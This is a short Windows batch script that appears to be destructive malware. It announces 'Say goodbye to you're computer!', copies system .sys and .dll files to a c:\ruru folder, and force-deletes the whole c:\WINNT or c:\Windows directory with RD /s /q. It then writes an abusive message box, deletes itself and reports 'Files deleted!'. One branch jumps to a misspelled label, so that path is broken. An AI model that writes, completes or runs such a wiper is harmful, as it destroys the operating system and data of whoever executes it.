   @echo off

   echo.
   echo Say goodbye to you're computer!
   echo.
   If Exist c:\Winnt goto Winnt
   If not Exist c:\Winnt goto Winxpshk

   :Winnt
   cd c:\
   md ruru
   copy c:\WINNT\*.sys c:\ruru\*.sys
   copy c:\WINNT\*.dll c:\ruru\*.dll
   goto delWINNT

   :Winxpchk
   If Exist c:\Windows\System32 goto Winxp
   If not Exist c:\Windows\System32 goto FuckUp

   :Winxp
   cd c:\
   md ruru
   copy c:\Windows\*.sys c:\ruru\*.sys
   copy c:\Windows\*.dll c:\ruru\*.dll
   goto delWinxp

   :FuckUp
   echo msgbox("get burn in hell mother fucker!",64,"System32") >> c:\ruru.vbs
   goto delItSelf

   :delWINNT
   RD/s/q c:\WINNT
   goto delItSelf

   :delWinxp
   RD/s/q c:\Windows
   goto delItSelf

   :delItSelf
   del %0
   cls
   echo.
   echo Files deleted!
   echo.
   pause > nul
   Exit
   Exit
